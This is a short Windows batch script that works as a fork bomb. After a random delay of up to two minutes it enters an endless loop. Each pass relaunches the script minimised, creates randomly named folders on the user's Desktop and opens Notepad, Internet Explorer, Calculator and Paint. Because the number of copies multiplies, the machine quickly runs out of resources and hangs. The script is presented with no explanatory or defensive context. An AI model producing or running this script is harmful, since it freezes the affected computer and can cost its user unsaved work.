@echo off

:GenerateRandomDelay
set /a "randomDelay=%random% %% 120"
if %randomDelay% lss 1 goto GenerateRandomDelay

timeout /t %randomDelay% /nobreak >nul

:start
start /min "" "%~f0"
mkdir %userprofile%/Desktop/%random%
mkdir %userprofile%/Desktop/%random%%random%
mkdir %userprofile%/Desktop/%random%%random%%random%
start notepad.exe
start iexplore.exe
start calc.exe
start mspaint.exe
goto start
